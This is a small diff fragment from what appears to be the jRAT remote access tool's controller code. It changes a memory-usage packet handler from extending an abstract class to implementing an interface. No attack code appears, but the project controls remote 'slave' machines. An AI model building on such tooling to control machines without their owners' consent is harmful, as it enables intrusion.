@@ -6,7 +6,7 @@ import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelMemoryUsage;
 
 
-public class Packet24UsedMemory extends AbstractIncomingPacket {
+public class Packet24UsedMemory implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
